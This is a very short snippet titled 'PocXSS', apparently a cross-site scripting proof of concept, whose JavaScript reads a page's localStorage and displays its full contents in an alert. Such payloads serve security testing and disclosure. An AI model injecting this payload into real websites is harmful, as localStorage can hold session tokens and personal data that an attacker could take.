# PocXSS
```
if ('localStorage' in window && window['localStorage'] !== null) {
    alert(JSON.stringify(window['localStorage']));
} 
```
